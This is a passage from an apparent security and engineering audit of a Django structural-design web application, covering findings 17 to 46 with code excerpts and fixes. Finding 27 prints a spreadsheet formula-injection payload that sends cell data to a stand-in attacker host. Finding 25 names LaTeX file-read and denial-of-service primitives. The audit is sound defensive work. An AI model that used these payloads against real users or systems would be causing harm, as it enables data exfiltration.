'DEFAULT_THROTTLE_RATES': {'anon': '60/hour', 'user': '600/hour',
                           'design': '30/hour', 'cad': '30/hour',
                           'report': '20/hour',  'pso': '5/hour'},
```

---

## 17. Unauthenticated CAD generation and export (plain Django `View`)

**Severity:** High · **Category:** Security
**Location:** `backend/apps/core/api/cad/cad_model_api.py:26-27`, `cad_model_export.py:42,164`

```python
# cad_model_api.py:26-27
class CADGeneration(View):          # django.views.View — DRF defaults DO NOT apply
    @method_decorator(csrf_exempt, name='dispatch')
```

These are plain Django `View`s, so `DEFAULT_PERMISSION_CLASSES` and
`DEFAULT_AUTHENTICATION_CLASSES` **do not apply**, and CSRF protection is explicitly disabled. There is
no `login_required` and no manual auth check.

**Impact:** any unauthenticated caller can invoke pythonocc/OpenCASCADE BREP→IFC/OBJ/STEP conversion
and STL/manifest assembly — heavy CPU and RAM work. The project already dedicates a `cad` queue with
`--max-tasks-per-child=10` specifically to bound pythonocc memory, and this path bypasses the guest
budget that the async design flow enforces.

**Confirmed mitigation:** `module_id` resolves through a **dict lookup** (`module_finder.py:196-222`),
so client input cannot become an arbitrary module import.

**Robustness bug:** an unknown `module_id` raises `KeyError` at `cad_model_export.py:85` outside any
`try` → unhandled 500; with `DEBUG=True` (the default, #20) that is a full Django technical page
disclosing settings and locals.

**Fix:** convert both to DRF `APIView` with `permission_classes = [IsEmailVerified]`, or add an
explicit auth check; wrap module resolution and return 400.

---

## 18. nginx serves `/osifiles/` unauthenticated, bypassing the DEBUG gate

**Severity:** High · **Category:** Security / DevOps
**Location:** `frontend/nginx.conf:52-53`; contrast `backend/config/urls.py:16-17`

```nginx
    location /osifiles/ {
        alias /app/osifiles/;
    }
```
```python
# config/urls.py:16-17 — deliberately DEBUG-gated
if settings.DEBUG:
    urlpatterns += static(settings.OSIFILES_URL, document_root=settings.OSIFILES_ROOT)
```

In production Django **intentionally does not** serve `.osi` files — but nginx serves the whole
directory unconditionally, with no auth, no `internal;`, and no `X-Accel-Redirect`. Because
`OsiFile.file` uses `upload_to=''`, the client controls the filename, so any name is fetchable.

**Impact:** unauthenticated read of all user-uploaded design files, defeating both the `OpenOsiById`
authorization attempt (#8) and the deliberate DEBUG-gated exposure decision.

**Fix:** remove the `/osifiles/` location from `nginx.conf` and serve downloads through an
authenticated Django view using `X-Accel-Redirect` into an `internal` location. If it must stay
static, add `add_header X-Content-Type-Options nosniff;` and `default_type application/octet-stream;`
and force a generated `.osi` extension server-side.

---

## 19. Cross-tenant design contamination via the shared SQLite catalog

**Severity:** High · **Category:** Security / Data-integrity
**Location:** `backend/apps/sections/options_merge.py:32-35, 66, 83`; catalog at
`osdag_core/Common.py:48` (`PATH_TO_DATABASE`)

```python
# options_merge.py:32-35
    try:
        ensure_custom_sections_in_sqlite(user)
    except Exception:
        pass                     # <-- silently hides write failures
...
# options_merge.py:66, 83
    conn = sqlite3.connect(str(PATH_TO_DATABASE))       # ONE global catalog file
...
            cursor.execute(
                f"""INSERT OR REPLACE INTO {table}
                (Designation, Mass, Area, D, B, tw, T, ...) VALUES (?, ?, ...)""")
```

Every authenticated request to a module `options/` endpoint copies that user's `UserCustom*` sections
into the **single shared** `Intg_osdag.sqlite` used by the calculation engine, with
`INSERT OR REPLACE` and no per-user partitioning.

**Impact — this is a structural-engineering safety issue, not just a data issue.** User A uploads a
custom section "WB 300" with attacker-chosen `Mass`, `Area`, `Iz`, `Iy`, `rz`, `ry`, `Zpy`. Once
synced, `osdag_core` resolves that designation for **every** user. User B then designs against
injected section properties and obtains a **structurally unsound result**. Both users see the same
designation in their dropdowns.

Additional problems: the SQLite rows are never cleaned up (`SectionCustomBulkDeleteView` deletes only
the Postgres rows), account deletion never touches them, and every `options()` request re-writes all
of that user's rows un-transacted into one shared file — a cross-worker write race.

**Confirmed mitigation:** the f-string interpolates only `table`, which comes from a hardcoded dict, and
all 22 values are bound parameters — **not** SQL injection.

**Fix:** stop mutating a shared catalog from request handling. Pass custom sections into the engine
per-request (a per-task temp SQLite copy, or a resolver overlay in the adapter). Namespace rows by
user. Remove the blanket `except Exception: pass` at `:34-35`.

---

## 20. Insecure configuration defaults

**Severity:** High · **Category:** Config
**Location:** `backend/config/settings.py:50,54`

```python
50: DEBUG = os.getenv('DEBUG', 'True').lower() == 'true'
54: ALLOWED_HOSTS = os.getenv('ALLOWED_HOSTS', '*').split(',')
```

The standard Django comments sit above both, but the **defaults are the unsafe branch**. `DEBUG=True`
yields full technical-500 pages with settings, resolved URLs, and local variables; `ALLOWED_HOSTS='*'`
accepts any `Host` header. `docker-compose.yml:43,93` repeats `DEBUG=${DEBUG:-True}`.

**Existing mitigations (do not over-read this):** `CsrfViewMiddleware` (`:118`),
`SecurityMiddleware` (`:114`), and `XFrameOptionsMiddleware` (`:121`) are enabled, and
`docker-compose.prod.yml` sets `DEBUG: "False"` with a narrow `ALLOWED_HOSTS` on every service. The risk
is every *other* deployment path — a bare `uvicorn`, a PaaS, a new compose file, a local run behind a
public tunnel.

Note the prod default `ALLOWED_HOSTS=localhost,127.0.0.1,backend,frontend` will 400 on a real
hostname, which pushes operators toward `ALLOWED_HOSTS=*` rather than toward setting it properly.

**Fix** — fail closed:
```python
DEBUG = os.getenv('DEBUG', 'False').lower() == 'true'
_hosts = os.getenv('ALLOWED_HOSTS', '').strip()
if not _hosts:
    raise ImproperlyConfigured("ALLOWED_HOSTS must be set explicitly.")
ALLOWED_HOSTS = [h.strip() for h in _hosts.split(',') if h.strip()]
```

---

## 21. Redis has no password

**Severity:** High · **Category:** Config
**Location:** `docker-compose.yml:20-26`, `docker-compose.prod.yml:17-26`,
`backend/config/settings.py:146-155,172-179`

```yaml
  redis:
    image: redis:7-alpine
    restart: unless-stopped
```
A repository-wide grep for `requirepass` / `REDIS_PASSWORD` returns **zero matches**.

**Confirmed and important — there is no RCE here.** `CELERY_ACCEPT_CONTENT = ['json']` with
`TASK_SERIALIZER = 'RESULT_SERIALIZER = 'json'` (`settings.py:174-176`) means a poisoned Celery
message is rejected with `ContentDisallowed`, not unpickled. This is the single most important
security control in the project and **must be preserved**.

**Impact:** Redis is not published to the host in prod, so exposure is limited to the compose network —
but every container there is implicitly trusted, and the dev compose also runs `cloudflared`, `grafana`
(anonymous Viewer enabled), and `influxdb`. Any of them can:
1. `SET celery-task-meta-<uuid>` to fabricate design results returned by `TaskStatusAPIView`
   (`AllowAny`, #7) and `TaskStatusConsumer`.
2. Publish directly to the Channels group `task_<uuid>` to inject arbitrary `task.update` messages into
   a victim's live WebSocket.

**Fix**
```yaml
  redis:
    command: ["redis-server", "--requirepass", "${REDIS_PASSWORD:?REDIS_PASSWORD is required}"]
```
```python
REDIS_URL = f"redis://:{os.environ['REDIS_PASSWORD']}@redis:6379/0"
```
Add `networks:` segmentation so `influxdb`/`grafana` are not on the app network.

---

# Medium

## 22. CORS allowlist hardcodes private LAN IPs with credentials enabled

**Location:** `backend/config/settings.py:57-68`

```python
CORS_ALLOWED_ORIGINS = [
    'http://localhost:5173', ..., 'http://127.0.0.1:5175',
    'http://192.168.1.9:5173',        # :64
    'http://10.104.135.9:5173',       # :65
    'http://10.186.46.253:5173'       # :66
]
CORS_ALLOW_CREDENTIALS = True          # :68
```
The list is commented "DEV ONLY" but has **no environment guard** — it is active in production too
(prod compose sets no CORS var). With `CORS_ALLOW_CREDENTIALS = True`, anyone who can occupy any of
those three internal IPs can host a page issuing **credentialed** cross-origin XHR to the API. Separately,
`.env:3` puts `.trycloudflare.com` in `ALLOWED_HOSTS` — a wildcard for a public tunnel domain.

**Fix:** gate the private-IP entries behind `if DEBUG:`; source the production allowlist from an env
var; set `CORS_ALLOW_CREDENTIALS = False` (the API is Bearer-token based and does not need it).

## 23. No transport-security or cookie-hardening settings

**Location:** `backend/config/settings.py` (all 340 lines) — each verified absent by grep:
`SECURE_SSL_REDIRECT`, `SECURE_HSTS_SECONDS`, `SECURE_PROXY_SSL_HEADER`, `SESSION_COOKIE_SECURE`,
`CSRF_COOKIE_SECURE`, `CSRF_TRUSTED_ORIGINS`, `DATA_UPLOAD_MAX_MEMORY_SIZE`,
`FILE_UPLOAD_MAX_MEMORY_SIZE`, `DATA_UPLOAD_MAX_NUMBER_FIELDS`.

`frontend/nginx.conf` listens on plain `:80`, so session and CSRF cookies travel in cleartext.
`SECURE_PROXY_SSL_HEADER` is unset, so Django cannot tell the request was secure even behind a TLS
terminator and will not apply `SECURE_*` logic. `django.contrib.sessions` is active (`:116`).
`X-Frame-Options: DENY` does apply via middleware (`:121`).

**Fix:** terminate TLS at nginx; set `SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')`,
`SECURE_HSTS_SECONDS = 31536000`, `SESSION_COOKIE_SECURE = True`, `CSRF_COOKIE_SECURE = True`, add the
deployed origin to `CSRF_TRUSTED_ORIGINS`, and set an explicit `DATA_UPLOAD_MAX_MEMORY_SIZE` — sized
deliberately, since `OpenOsiUpload` reads an entire upload into memory (#26).

## 24. Firebase token revocation is ignored and deleted users are auto-recreated

**Location:** `backend/apps/core/middleware/firebase_auth.py:69,73,79-84,124-131`

```python
 69:            decoded = firebase_auth.verify_id_token(token)      # no check_revoked=True
...
 79:            user, created = User.objects.get_or_create(
 80:                username=uid,
 81:                defaults={'email': email or ''}
 82:            )
...
124:            timeout = max(0, exp - current_time)
125:            if timeout > 0:
126:                cache.set(cache_key, {...}, timeout=timeout)     # cached for the full token life
```

**Impact:** an admin disables or deletes a user in Firebase, or the user calls
`POST /api/auth/delete-account/` — but the user keeps full API access with the old token until it
expires (up to 1 hour), and the local `User` row is silently **recreated** on the next request. A local
deletion or `is_active=False` flag is therefore not a durable control.

*Partially mitigated:* the cache path does correctly re-check `is_active` on every hit (`:59-60`,
`:86-87`), so only row **deletion** is undone.

**Fix:** use `verify_id_token(token, check_revoked=True)`; shorten the cache TTL to ~300 s and
populate a Redis revocation set from the delete-account flow; do not `get_or_create` on the auth path
— fail closed when the local user is missing and provision only via `FirebaseAuthView`. Related:
`delete_account_api.py:28-41` swallows Firebase deletion failures (`except Exception` → `logger.warning`)
and proceeds with the local delete, so GDPR erasure completes only on the local side and silently.

## 25. LaTeX injection from client-controlled `logs` / `metadata`

**Location:** `design_report_pdf_view.py:124-132` → `osdag_core/design_report/reportGenerator_latex.py:181,526`
→ compiled at `report_customization_api.py:303-306`

```python
# design_report_pdf_view.py:124-132
            metadata_final = metadata            # raw client dict, aliased
...
        if logs and isinstance(logs, list):
            logger_string = '\n'.join([f"{log.get('timestamp','')} - {log.get('type','INFO')} - {log.get('message','')}" for log in logs])
...
        metadata_final['logger_messages'] = logger_string
```
```python
# report_customization_api.py:303-306
                        result = subprocess.run([
                            pdflatex_exe, '-interaction=nonstopmode', 'filtered_report.tex'
                        ], capture_output=True, text=True, timeout=60)
```

`metadata` and `logs` flow unescaped into the generated `.tex`. No LaTeX escaping or character filtering
is applied at the application layer.

**Impact (confirmed in TeX's default *restricted* mode):** file-read / existence oracle
(`\input`, `\openin` pull files into the returned PDF), DoS via recursive macro definitions hanging the
compiler for the 60 s timeout **twice per request** (`:302`, `for pass_num in (1, 2)`), and `.aux`/`.log`
write amplification into the temp dir.

**`UNVERIFIED` — not claimed as RCE.** `\immediate\write18` is disabled by `shell_escape=p restricted`
(the TeX Live default), and no `--shell-escape` appears in the code. Escalation to OS command execution
depends on `texmf.cnf` inside the backend image, which is not in this repository. Whether PyLaTeX
auto-escapes `uiObj[i]` was also not confirmed (the package is not installed locally).

**Fix:** pass `-no-shell-escape` explicitly (do not rely on the distribution default); set
`openin_any=r` / `openout_any=p` in the image's `texmf.cnf`; escape every caller-supplied metadata
value before interpolation; cap `logs` length and count. Consider moving this endpoint onto the
`reports` Celery queue and returning `202 + task_id` for consistency with the rest of the app.

## 26. Unbounded uploads; entire file read into RAM

**Location:** `backend/apps/core/api/projects/osi_api.py:52,62` (`OpenOsiUpload`,
`permission_classes = [AllowAny]`), `backend/apps/sections/views.py:158,196` (`SectionImportView`)

```python
# osi_api.py:62
            content = uploaded.read().decode('utf-8', errors='replace')
```
Neither endpoint checks `upload.size`. `DATA_UPLOAD_MAX_MEMORY_SIZE` /
`FILE_UPLOAD_MAX_MEMORY_SIZE` are unset, and in any case do not reject large multipart files — they
only choose memory vs temp file. `SECTION_IMPORT_MAX_ROWS` (`views.py:32`) caps *rows*, not bytes, so
an xlsx zip bomb decompresses to gigabytes inside `openpyxl`.

**Fix:** reject `upload.size > 5 MB` before parsing; use `load_workbook(..., read_only=True)`; add an
explicit total-bytes cap; set `DATA_UPLOAD_MAX_MEMORY_SIZE`. This also arms the fix for #8.

## 27. XLSX formula injection in section exports

**Location:** `backend/apps/sections/export_scopes.py:34-35`, `backend/apps/sections/views.py:136-138`

```python
34:    for obj in qs.iterator(chunk_size=500):
35:        ws.append([getattr(obj, h) for h in headers])
```
Values are written to cells unmodified. `openpyxl` assigns `data_type='f'` to any string beginning
with `=`, so a user-registered `Designation` such as
`=HYPERLINK("https://attacker.tld/?x="&A1,"Click")` is exported as a **live formula**. The victim
opening the export in Excel evaluates it — data exfiltration via the URL argument, phishing links.
(There is no CSV export path, so the classic CSV-injection variant does not apply.)

**Fix:** prefix any string starting with `= + - @ TAB CR` with `'`, or set the cell's `data_type='s'`.

## 28. `CompanyLogoView`: guest upload, arbitrary extension, absolute path disclosure

**Location:** `backend/apps/core/api/design/design_report_pdf_view.py:261-281`

```python
264:    def post(self, request):
265:        file = request.data['file']
267:        original_ext = os.path.splitext(file.name)[1].lower() or ".png"
268:        fileName = ''.join(str(uuid.uuid4()).split('-')) + original_ext
...
280:            return Response({'message': 'successfully saved file', 'logoFullPath' : logoFullPath}, status=201)
```
No `permission_classes` (→ guests allowed), no size limit, no content validation, and the **extension
comes from the client filename** with only `.lower()` — `.html`, `.svg`, `.py` all pass. The response
returns the **absolute server path**, which discloses the container layout and materially assists #5.
The returned path is also fed into the LaTeX report as `metadata.CompanyLogo`, making it an injection
input for #25. The filename is a fresh UUID, so no traversal.

**Fix:** `permission_classes = [IsEmailVerified]`; allowlist `{.png, .jpg, .jpeg, .pdf}`; derive the
extension from the allowlist rather than the client name; verify the bytes decode as an image; return a
relative path or media URL.

## 29. Raw `str(exception)` returned to clients

**Verified sites:** `shear_connection/views.py:160`, `moment_connection/views.py:210`,
`flexure_member/views.py:187`, `simple_connection/views.py:139`, `tension_member/views.py:156`,
`compression_member/views.py:208,291`, `base_plate/views.py:87`, `osi_api.py:46,77,101,151`,
`report_customization_api.py:181,370,517`, `core/views.py:214`, `firebase_auth.py:140`.

Every one of the seven parent ViewSets is `permission_classes = [AllowAny]`, and `core/views.py:214`
is on the **unauthenticated** login endpoint. Triggering a downstream error returns absolute file
paths, SQL fragments, model/field names, and library internals — e.g.
`report_customization_api.py:473` returns `"LaTeX file not found at {tex_file_path}"`.

**Fix:** log the full exception server-side (`logger.exception`) and return a fixed message plus a
correlation id. For `FirebaseAuthView` return only the specific `InvalidIdTokenError` /
`ExpiredIdTokenError` cases. There is an existing `apps/core/utils/errors.py` with
`format_error_response` / `get_error_status_code` (already imported by `base_plate` and
`simple_connection` but unused) — use it.

## 30. `populate_database.py` hardcodes a password and fails silently

**Location:** `populate_database.py:13`, `:44-45`

```python
13: db_password = os.getenv('DATABASE_PASSWORD', 'password')
...
44: except Exception as e:
45:     print('Database population error:', e)      # prints, then exits 0
```
This script runs on **every container start** (`docker-compose.yml:68`, `docker-compose.prod.yml:58`).
If `DATABASE_PASSWORD` is unset it silently uses the literal `password` — the same value committed in
`.env` (see #1) — and on failure prints a non-fatal message and **exits 0**, so `manage.py migrate`
appears to succeed while the catalog was never seeded.

Note `backend/config/postgres_credentials.py:13-20` and `config/secret_key.py:6-13` both correctly
**fail closed** with `ImproperlyConfigured` — that is the pattern to follow here.

**Fix:** use the same `raise ImproperlyConfigured` pattern and `sys.exit(1)` on failure.

## 31. No Celery reliability settings

**Location:** `backend/config/settings.py:172-203`; `docker-compose.prod.yml`

Grep for `acks_late|reject_on_worker_lost|prefetch|visibility_timeout|broker_transport_options|task_track_started`
across the whole repository returns nothing. All Celery defaults apply: `task_acks_late=False`,
`worker_prefetch_multiplier=4`, `task_track_started=False`, no broker visibility timeout.

**Impact**
- *Early-ack + long CAD jobs:* `docker-compose.prod.yml:115` uses `--max-tasks-per-child=10`. A worker
  OOM-killed mid-CAD task has already acked it, so the task is **silently lost** and the frontend
  WebSocket never receives `result` or `error` — the UI hangs.
- *Prefetch 4* on a GIL-bound engine: one worker can hold 4 CAD jobs it cannot start, starving its
  prefork siblings.

**Fix:**
```python
CELERY_TASK_ACKS_LATE = True
CELERY_TASK_REJECT_ON_WORKER_LOST = True
CELERY_WORKER_PREFETCH_MULTIPLIER = 1
CELERY_BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 7200}
CELERY_TASK_TRACK_STARTED = True
```

## 32. PSO task is unrouted and lands on the latency-critical `calculations` queue

**Location:** `backend/config/settings.py:191,193-203`; `plate_girder/tasks.py:98`
```python
98: @shared_task(bind=True, max_retries=3)
def run_pso_optimization(self, channel_name, input_data): ...
```
`CELERY_TASK_ROUTES` maps only three task names and `CELERY_DEFAULT_QUEUE = 'calculations'`. The PSO
task declares no `queue=`, so the single heaviest CPU workload in the system runs in the same pool as
interactive design calculations (`-Q calculations --concurrency=18` in prod). One plate-girder run
starves user-facing design latency. Combined with `max_retries=3` and no auth on the consumer (#6),
each failing run retries three times against a `channel_name` that may already be gone.

**Fix:** add `'…plate_girder.tasks.run_pso_optimization': {'queue': 'optimize'}` and a dedicated
low-concurrency worker (e.g. 2).

## 33. `celery.py` bare `except` hides PSO task registration failure

**Location:** `backend/config/celery.py:13-18`
```python
try:
    from django.conf import settings
    extra_modules = ["apps.modules.flexure_member.submodules.plate_girder"]
    app.autodiscover_tasks(lambda: list(settings.INSTALLED_APPS) + extra_modules)
except Exception:
    app.autodiscover_tasks()
```
`plate_girder/tasks.py` is three levels below any app in `INSTALLED_APPS` and is the **only**
`tasks.py` under `apps/modules/`, so it is reachable *only* via `extra_modules`. If the `try` block
raises for any reason, autodiscovery silently degrades, the PSO task is never registered, and workers
reject it at runtime with *"Received unregistered task"* — with no diagnostic, because the bare
`except Exception` swallowed the cause.

**Fix:** catch only `ImproperlyConfigured`; `logger.exception(...)` and re-raise on anything else, so
the worker refuses to boot with a half-registered task set. Better: move `run_pso_optimization` into
`apps/core/tasks.py` and delete the `extra_modules` hack.

## 34. `CONN_MAX_AGE` is unset

**Location:** `backend/config/settings.py:161-170` — no `CONN_MAX_AGE`, no `ATOMIC_REQUESTS` anywhere in
the repo. Default is `0`, so a new psycopg2 connection + TCP + auth handshake is established for
**every request**. With 8 gunicorn workers (dev) / 4 (prod) plus Celery pools at concurrency 18/8/4,
this is a large, entirely avoidable connection storm against Postgres 14. **Fix:** `CONN_MAX_AGE = 60`.

## 35. `get_service_class` resolves globally, ignoring the parent module

**Location:** `backend/apps/core/tasks.py:8-15`

```python
def get_service_class(module_name: str, submodule_slug: str):
    from apps.core.registry import BaseModuleRegistry
    slug = submodule_slug.replace('_', '-')
    service_class = BaseModuleRegistry._global_registry.get(slug)
    if service_class:
        return service_class          # <-- global first; module_name never consulted
    if module_name == 'shear-connection':
        ...
```
`ServiceClass` is resolved in the view but **not passed to the task** — `trigger_async_design`
(`module_helpers.py:174-180`) sends only `module_name`, `submodule_slug`, and inputs, so the worker
re-resolves through this global-first path. Five of six parents **inherit the same global dict** (only
`compression` defines its own).

**Impact:** latent, not currently exploitable — I checked all slugs and there are **no cross-parent
duplicates today**. But if any two parents ever share a slug, the last auto-discovered one wins
*globally* and the per-parent allowlist check in the view is bypassed: a request allowlisted for parent
A executes parent B's service, producing a **wrong-module design result**. That is exactly the failure
mode this audit's engineering-correctness findings are about.

**Fix:** resolve by parent first, fall back to the global map only for legacy aliases, and give every
parent its own registry dict (as `compression` already does). Add a test asserting slug uniqueness
across all parents.

## 36. Five CAD section contracts reject their own default sections

`get_default_sections` (`cad_helpers.py:55-67`) returns `SECTION_MAPPINGS[parent][slug]`, and
`trigger_async_cad` (`module_helpers.py:209-214`) uses it whenever the request omits `sections`. Each
adapter's `create_cad_model` then validates against its own allowlist. Five combinations are
self-contradictory:

| Slug | Default sections (`cad_helpers.py`) | Adapter allowlist | Rejected |
|---|---|---|---|
| `beam-beam-cover-plate-welded` | `Model, Beam, Connector, Weld` (`:20`) | `Model, Beam, CoverPlate, Bolt, Weld` | `Connector` |
| `column-column-end-plate` | `Model, Column, Connector, Bolt, Weld` (`:26`) | `Model, Column, Connector` | `Bolt`, `Weld` |
| `tension-member/bolted` | `Model, Member, Plate, Endplate` (`:36`) | `Model, Member, Plate, Connector` | `Endplate` |
| `tension-member/welded` | same (`:37`) | same | `Endplate` |
| `compression-member/struts-welded` | `Model, Member, Plate, Endplate` (`:48`) | `Model, Member, Plate, Connector` | `Endplate` |

**Impact:** tempered by `generate_cad_models` (`cad_helpers.py:135-168`), which wraps each section in
`try/except` and records a per-section warning rather than aborting. The user gets a **partial model
with silently missing parts** — no 500, no visible error in the 3D viewer.

**Fix:** make `SECTION_MAPPINGS` derive from the adapters' allowlists, or add a generated consistency
test asserting `set(SECTION_MAPPINGS[p][s]) ⊆ adapter_allowlist(p, s)` for all 27 submodules. First
reconcile `Endplate` vs `Connector` — one of the two names is wrong.

## 37. `header-plate` is missing from `SECTION_MAPPINGS` → silently incomplete CAD

**Location:** `backend/apps/core/utils/cad_helpers.py:12-17` vs `header_plate/adapter.py:390`

The shear mapping contains `fin-plate`, `cleat-angle`, **`end-plate`** (stale — no such folder), and
`seated-angle` — but no `header-plate`. `get_default_sections('shear-connection','header-plate')` hits
the `.get(slug, ['Model'])` fallback and returns `['Model']`.

**Impact:** the frontend end-plate module (`apiRoutes.js:43` maps `END_PLATE →
shear-connection/header-plate`) generates only the merged model. `Beam`, `Column`, `Plate`, `Bolt`, and
`Weld` parts are never produced unless the client explicitly sends `sections`. **No error is raised.**

**Fix:** replace the stale `end-plate` entry with `header-plate`. Also remove the dead `end-plate` rows
in `backend/apps/core/constants.py:12` and note that `core/constants.py` has no `header-plate`,
`on-cantilever`, `plate-girder`, or base-plate entry.

## 38. Seated-angle report `MODULE_ID` mismatch

**Location:** `shear_connection/views.py:30` and `core/constants.py:13` use
`"Seated-Angle-Connection"`; `seated_angle/__init__.py:5` declares `MODULE_ID = 'SeatedAngleConnection'`.
A hyphenated id that no engine class declares will not resolve, so seated-angle reports fail or render
the wrong template. Every other shear id matches its `__init__.py`.

**Fix:** use `'SeatedAngleConnection'` in both maps; add a test asserting every
`*_REPORT_MODULE_ID_MAP` value equals the corresponding submodule's `MODULE_ID`. Related:
`base_plate` has **no report action at all** (`views.py` defines only `design`, `options`, `cad`;
`trigger_async_report` is imported at `:15` and unused) so
`POST /api/modules/base-plate/report/generate-initial/` → 404.

## 39. Purlin span is labelled in metres but sent as millimetres

**Location:** `frontend/.../purlinConfig.js:107` → `adapter.py` → `flexure_cantilever.py:758`

`effective_span` is labelled in **metres** in the UI and is sent as `Member.Length` with **no `×1000`
conversion**. `flexure_cantilever.py:758` does `float(design_dictionary[KEY_LENGTH])` and uses it
directly as **mm**. Compare `on_cantilever`, where `member_length` is labelled in mm (default `5000`)
and is consistent.

**Impact:** after fixing #3, a span entered in metres models the member **1000× too short** — a
silently wrong structural result.

**Status:** `UNVERIFIED` by execution. The static reading strongly indicates the omission, but no design
was run to confirm no downstream conversion exists. **Verify before fixing** — it may be intentional if
a conversion happens in the adapter.

## 40. Silent `Area/100` data corruption

**Location:** `backend/apps/sections/options_merge.py:88` (also `:104`, `:120`)
```python
float(obj.Area) / 100.0 if float(obj.Area) > 1000 else float(obj.Area)
```
A legitimately large area > 1000 mm² is silently divided by 100, so the engine computes with wrong
section properties. This heuristic encodes a unit-convention mismatch rather than fixing it.

**Fix:** remove the heuristic; normalise the unit convention at the serializer/validation layer where
`Area` is accepted, and reject ambiguous values.

## 41. `Project.user_email` is unindexed, nullable, and not a foreign key

**Location:** `backend/apps/core/models.py:29`
```python
    user_email = models.CharField(max_length=200, blank=True, null=True)
```
Every project read/write filters on this column (10 call sites: `project_api.py:30,132,137,181,233,271,310`,
`my_data_api.py:21`, `export_data_api.py:38`, `osi_api.py:132`, `delete_account_api.py:37`).

**Impact**
- *Performance:* unindexed `CharField(200)` on the only filter column of the most frequently queried
  user-scoped table → sequential scan per request.
- *Integrity:* nullable and not a FK, so there is no cascade — a deleted `User` orphans `Project` rows.
  `delete_account_api.py:37` compensates with a manual delete that only works when
  `request.user.email` is non-empty; if blank, the delete is silently skipped and PII is retained
  (GDPR exposure).
- *Denormalization:* email is mutable — a Firebase email change (`firebase_auth.py:90-92`) orphans the
  user's projects with no reconciliation path. `UserAccount.email` is `unique=True` but with **no case
  normalisation**, so `A@x.com` and `a@x.com` are distinct users.

**Fix:** `user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name='projects', null=True, db_index=True)`; backfill from `user_email`; index `Project.name` and `Project.updated_at` (both filtered/ordered today); normalise email to lowercase on write.

## 42. Unbounded `JSONField` for full engine I/O

**Location:** `backend/apps/core/models.py:24-26`; written from raw bodies at `project_api.py:101-102,195-197`
```python
    inputs_json  = models.JSONField(blank=True, null=True)
    outputs_json = models.JSONField(blank=True, null=True)
```
No size cap, no schema validation, no depth limit. `DATA_UPLOAD_MAX_MEMORY_SIZE` is Django's default
2.5 MB and `DATA_UPLOAD_MAX_NUMBER_FIELDS` is unset, so a single `PUT /api/projects/<id>/` can store a
multi-megabyte deeply-nested document per project, per user, repeatedly. `outputs_json` contains the
complete `CustomLogger` log buffer (`tasks.py:123-135`).

**Fix:** cap size/depth in `ProjectDetailAPI.put`; set explicit `DATA_UPLOAD_MAX_MEMORY_SIZE` and
`DATA_UPLOAD_MAX_NUMBER_FIELDS`; truncate `logs` before persisting (the WebSocket path already caps at
500 KB in `signals.py:137` — persistence should do the same).

## 43. `OsiFile.owner_email` is never persisted, so ownership is always NULL

**Location:** writer `backend/apps/core/api/auth/user_view.py:50-52`, serializer `serializers.py:30-35`, model `models.py:40-54`
```python
# models.py:42-43
    file = models.FileField(upload_to='', storage=osi_file_storage)
    owner_email = models.CharField(max_length=200, blank=True, null=True)
```
```python
# user_view.py:50-52
    serializer = OsiFileSerializer(data={'file': uploaded_file})
    if serializer.is_valid():
        osifile = serializer.save()          # owner_email never set
```
`OsiFileSerializer.Meta.fields = ['id','file','created_at']` — so `owner_email`, `original_name`,
`size_bytes`, and `content_type` are **always NULL**. This is the root cause of #8. Additionally
`upload_to=''` preserves the client filename with no per-user prefix, creating a filename
collision/overwrite surface.

*Note:* classic `../` traversal in the filename is **blocked** by Django ≥3.2.13's
`validate_file_name` — this is a data-isolation finding, not a traversal finding.

**Fix:** populate all fields in `create()`; set `upload_to` to a per-user date-sharded callable
(`osifiles/{owner}/{YYYY}/{MM}/`); make `owner_email` `NOT NULL`.

## 44. Destructive, irreversible `RunPython` migration

**Location:** `backend/apps/core/migrations/0012_custommaterials_user_owned.py:6-8, 28`
```python
def clear_legacy_custom_materials(apps, schema_editor):
    CustomMaterials = apps.get_model("core", "CustomMaterials")
    CustomMaterials.objects.all().delete()      # unconditional truncate
...
    migrations.RunPython(clear_legacy_custom_materials, migrations.RunPython.noop),
```
Every `CustomMaterials` row is destroyed, and the reverse is `noop` — so `migrate core 0011` **cannot
restore the data**. The old schema keyed ownership by an `email` column (removed at `:29-32`), so the
data was not meaningless; a non-destructive migration would have been
`UPDATE core_custommaterials SET user_id = (SELECT id FROM auth_user WHERE email = custommaterials.email)`
before dropping `email`.

**Also:** migration `0014` performs `migrations.DeleteModel(name='Design')` with no data migration and
no reverse. `0016` removes `UserAccount.deletion_requested_at` immediately after `0015` added it — a
no-op pair that leaves dead schema history, the clearest signal these need squashing. Django version
drift: `0001` header says 4.2.21, `0013`–`0016` say 4.2.30.

**Fix:** never ship a destructive `RunPython` in a shared migration. Backfill, or gate deletion behind
an explicit ops-run script referenced in the release notes. Then squash `0001`–`0016`.

## 45. No Python linter or type-checker anywhere in the repo

**Severity:** Medium · **Category:** Quality

Exhaustive search found **zero** occurrences of any Python static-analysis configuration — no
`pyproject.toml`, `setup.cfg`, `tox.ini`, `pytest.ini`, `.flake8`, `ruff.toml`, `.pylintrc`,
`mypy.ini`, or `.pre-commit-config.yaml`, at any depth outside `node_modules`/`.git`. No `ruff`,
`flake8`, `pylint`, `black`, or `isort` reference in `.github/` or `requirements.txt`.

`backend/` contains only `__init__.py`, `apps/`, `config/`, `conftest.py`, `manage.py`. The only
static gate on the largest surface in the project — including the vendored `osdag_core` — is **none**.

**Fix:** add `pyproject.toml` with `ruff` (fast, single tool) and a `pre-commit` hook:
```toml
[tool.ruff]
line-length = 120
target-version = "py311"
[tool.ruff.lint]
select = ["E","F","W","I","B","UP","S","BLE","ARG"]
ignore = ["E501"]
```
Then wire `ruff check backend/` into `ci.yml` alongside the existing frontend `npm run lint`. Ruff's `S`
(bandit) rules would have caught #1, #5, #17, #30, and #53 at commit time.

## 46. CI skips all backend tests, and the module layer has zero coverage

**Location:** `backend/conftest.py`
```python
def pytest_collection_modifyitems(config, items):
    if os.environ.get('CI') == 'true':
        skip_ci = pytest.mark.skip(reason="Skipping all backend tests in CI environment")
        for item in items:
            item.add_marker(skip_ci)
```
GitHub Actions sets `CI=true` automatically, so **every** collected test is skipped in CI. The
`backend-qa` job's `xvfb-run python -m pytest --ds=config.settings` step always passes vacuously.

**Inventory:** 7 test files, **51 test functions** total, all under `backend/apps/core/`:

| File | Tests |
|---|---|
| `apps/core/tests/test_api.py` | 20 |
| `apps/core/utils/tests/test_report_image_generator.py` | 12 |
| `apps/core/tests/test_design_pref_sync.py` | 8 |
